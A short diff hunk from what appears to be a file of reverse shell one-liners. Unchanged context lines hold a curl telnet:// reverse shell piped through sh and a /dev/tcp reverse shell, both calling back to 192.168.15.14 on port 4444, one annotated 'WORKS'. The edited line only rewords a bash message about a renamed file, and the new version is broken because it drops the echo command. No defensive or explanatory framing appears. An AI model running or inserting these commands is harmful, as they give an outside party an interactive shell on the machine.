@@ -31,7 +31,7 @@ C='curl -Ns telnet://192.168.15.14:4444'; $C </dev/null 2>&1 | sh 2>&1 | $C >/de
 WORKS 
 
 sh -i >& /dev/tcp/192.168.15.14/4444 0>&1
-/bin/bash -c "echo file renamed: \$FILE"
+/bin/bash -c "File renamed. Deprecated name: \$FILE"
 
 # sh -c "echo this old filename has been changed and is now deprecated: \$FILE"
 
